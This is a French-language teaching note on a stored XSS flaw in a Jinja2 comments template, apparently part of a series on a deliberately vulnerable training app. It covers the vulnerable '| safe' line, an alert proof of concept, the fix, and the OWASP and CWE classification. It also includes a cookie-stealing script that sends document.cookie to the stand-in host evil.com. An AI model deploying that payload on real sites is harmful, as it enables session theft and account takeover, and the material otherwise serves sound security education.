# Faille 03 — XSS (Cross-Site Scripting)

## Concept

Quand une app affiche du contenu utilisateur sans l'échapper, un attaquant peut
injecter du HTML/JavaScript. Ce code s'exécute dans le navigateur de chaque
visiteur qui charge la page — comme s'il venait du site légitime.

## Code vulnérable

```html
<!-- templates/comments.html — ligne 31 -->
<div>{{ c['content'] | safe }}</div>
```

`| safe` dit à Jinja2 de ne pas échapper le contenu → le HTML est injecté tel quel.

## Exploit

Poster ce commentaire dans le formulaire :
```html
<script>alert('XSS fonctionne !')</script>
```

Tous les visiteurs de la page voient la popup s'exécuter.

Payload réel pour voler un cookie de session :
```html
<script>
  document.location = 'http://evil.com/steal?c=' + document.cookie
</script>
```
→ Chaque visiteur connecté est redirigé, son cookie envoyé à l'attaquant.
Combiné avec la faille 02, l'attaquant peut usurper son identité.

## Fix

```html
<!-- Retirer | safe — Jinja2 échappe automatiquement -->
<div>{{ c['content'] }}</div>
```

`<script>alert(1)</script>` devient `&lt;script&gt;alert(1)&lt;/script&gt;`
→ affiché comme texte, jamais exécuté.

## Classification

- **OWASP Top 10 :** A03:2021 — Injection
- **CWE :** CWE-79 — Improper Neutralization of Input During Web Page Generation
- **Type :** XSS stocké (Stored XSS) — le payload est en base de données
- **Impact :** Vol de session, redirection, defacement, keylogging

## Ressources

- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
